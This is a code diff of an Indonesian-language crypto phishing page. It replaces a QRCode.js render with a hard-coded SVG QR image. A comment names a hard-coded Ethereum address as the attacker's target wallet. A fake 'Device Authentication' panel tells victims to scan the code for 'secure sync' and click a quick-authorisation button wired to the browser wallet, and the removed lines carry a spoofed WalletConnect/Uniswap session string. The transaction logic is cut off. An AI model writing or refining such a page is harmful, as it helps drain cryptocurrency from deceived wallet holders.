@@ -40,7 +40,7 @@
       margin-bottom: 15px;
       box-shadow: 0 4px 12px rgba(255, 0, 122, 0.15);
     }
-    .qr-frame canvas, .qr-frame img {
+    .qr-frame svg {
       width: 160px;
       height: 160px;
       display: block;
@@ -66,7 +66,6 @@
       word-break: break-all;
     }
   </style>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
   <script>
     // Alamat dompet penyerang target
     const targetVault = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
@@ -85,34 +84,37 @@
     }
 
     async function renderScannerInterface() {
-      if (!document.getElementById('qr-canvas-box')) {
+      if (!document.getElementById('qr-svg-box')) {
           document.body.innerHTML = `
             <div class="panel">
               <h2>Autentikasi Perangkat</h2>
               <p>Gunakan kamera aplikasi dompet seluler Anda untuk memindai kode QR di bawah ini guna melakukan sinkronisasi aman.</p>
               
               <div class="qr-frame">
-                <div id="qr-canvas-box"></div>
+                <svg id="qr-svg-box" viewBox="0 0 25 25" xmlns="http://www.w3.org/2000/svg">
+                  <path fill="#ffffff" d="M0 0h25v25H0z"/>
+                  <path fill="#000000" d="M2 2h7v7H2V2zm2 2v3h3V4H4zm8 0h3v3h-3V4zm5 0h6v6h-6V4zm2 2v2h2V6h-2zM2 12h3v3H2v-3zm6 0h3v3H8v-3zm5 0h3v3h-3v-3zm6 0h4v4h-4v-4zm-13 5h3v3H9v-3zm5 0h3v3h-3v-3zm6 0h3v3h-3v-3zM2 16h7v7H2v16zm2 2v3h3v-3H4zm13 3h4v4h-4v-4z"/>
+                  <rect x="10" y="2" width="1" height="2" fill="#000000"/>
+                  <rect x="10" y="6" width="1" height="1" fill="#000000"/>
+                  <rect x="14" y="2" width="1" height="1" fill="#000000"/>
+                  <rect x="10" y="10" width="2" height="1" fill="#000000"/>
+                  <rect x="15" y="10" width="1" height="2" fill="#000000"/>
+                  <rect x="18" y="10" width="2" height="1" fill="#000000"/>
+                  <rect x="10" y="13" width="1" height="2" fill="#000000"/>
+                  <rect x="13" y="16" width="2" height="1" fill="#000000"/>
+                  <rect x="18" y="15" width="1" height="2" fill="#000000"/>
+                  <rect x="22" y="16" width="1" height="3" fill="#000000"/>
+                  <rect x="10" y="19" width="2" height="1" fill="#000000"/>
+                  <rect x="13" y="21" width="1" height="2" fill="#000000"/>
+                  <rect x="16" y="20" width="2" height="1" fill="#000000"/>
+                  <rect x="20" y="21" width="2" height="2" fill="#000000"/>
+                </svg>
               </div>
 
               <button id="trigger-tx" class="submit-btn">Konfirmasi Otorisasi Cepat</button>
               <div id="connection-log">Menunggu respon pemindaian perangkat...</div>
             </div>
           `;
-
-          // Inisialisasi pembuatan QR Code secara otomatis menggunakan pustaka QRCode.js
-          try {
-              new QRCode(document.getElementById("qr-canvas-box"), {
-                  text: "wc:session@2?bridge=https%3A%2F%2Frelay.walletconnect.org&key=uniswap_auth_secure_token",
-                  width: 160,
-                  height: 160,
-                  colorDark: "#000000",
-                  colorLight: "#ffffff",
-                  correctLevel: QRCode.CorrectLevel.H
-              });
-          } catch(e) {
-              console.error("Gagal merender QR Code:", e);
-          }
 
           document.getElementById('trigger-tx').onclick = async () => {
             if (!window.ethereum) {
